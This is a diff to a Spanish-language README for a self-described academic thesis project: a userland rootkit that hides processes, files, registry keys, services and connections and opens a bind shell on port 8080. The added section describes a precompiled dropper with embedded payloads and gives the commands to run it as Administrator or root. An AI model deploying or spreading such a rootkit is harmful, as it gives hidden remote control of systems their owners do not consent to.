@@ -4,6 +4,20 @@ Proyecto académico de Trabajo de Fin de Grado (TFG) para el Grado en Ingenierí
 
 Implementación de un rootkit userland que oculta procesos, ficheros, claves de registro, servicios y conexiones de red con el prefijo `secreto_`. Incluye bind shell en puerto TCP 8080 y un único punto de despliegue multiplataforma.
 
+## Uso rápido — dropper ya compilado
+
+El fichero `secreto_dropper.py` incluido en este repositorio **ya contiene todos los payloads embebidos** (Stager, PayloadDLL x64/x86 y módulo Linux x86_64). No es necesario compilar nada ni ejecutar el builder para desplegarlo.
+
+**Windows (como Administrador):**
+```
+python secreto_dropper.py
+```
+
+**Linux (como root):**
+```
+python3 secreto_dropper.py
+```
+
 ---
 
 ## Estructura del repositorio
